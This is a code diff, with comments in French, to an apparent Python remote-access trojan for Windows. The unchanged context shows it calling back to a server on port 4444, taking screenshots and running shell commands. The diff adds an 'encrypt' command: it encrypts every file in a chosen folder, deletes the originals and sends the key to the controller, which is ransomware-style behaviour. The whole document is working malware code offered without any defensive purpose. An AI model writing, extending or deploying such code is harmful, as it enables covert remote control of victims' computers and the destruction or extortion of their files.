@@ -7,8 +7,10 @@ import time
 import shutil
 import winreg
 import mss
+from cryptography.fernet import Fernet
 
-SERVER_IP = "192.168.1.100"
+
+SERVER_IP = "192.168.83.133"
 SERVER_PORT = 4444
 BUFFER = 4096
 
@@ -66,6 +68,11 @@ def main():
                     elif commande == "screenshot":
                         data = take_screenshot()
                         sock.sendall(data)
+
+                    elif commande.startswith("encrypt "):
+                        chemin = commande.split(" ", 1)[1]
+                        resultat = encrypt_folder(chemin)
+                        sock.send(resultat.encode())
 
                     else:
                         resultat = execute_cmd(commande)
@@ -161,6 +168,35 @@ def execute_cmd(cmd):
     if not output.strip():
         output = "(pas de sortie)"
     return output
+
+
+# chiffre tous les fichiers d'un dossier avec AES et renvoie la clef
+def encrypt_folder(chemin):
+    try:
+        if not os.path.isdir(chemin):
+            return f"Erreur: {chemin} n'est pas un dossier"
+
+        clef = Fernet.generate_key()
+        fernet = Fernet(clef)
+        compteur = 0
+
+        for racine, dossiers, fichiers in os.walk(chemin):
+            for nom in fichiers:
+                filepath = os.path.join(racine, nom)
+                try:
+                    with open(filepath, "rb") as f:
+                        contenu = f.read()
+                    chiffre = fernet.encrypt(contenu)
+                    with open(filepath + ".enc", "wb") as f:
+                        f.write(chiffre)
+                    os.remove(filepath)
+                    compteur += 1
+                except:
+                    pass
+
+        return f"{compteur} fichiers chiffres dans {chemin}\nCLEF:{clef.decode()}"
+    except Exception as e:
+        return f"Erreur chiffrement: {e}"
 
 
 if __name__ == "__main__":
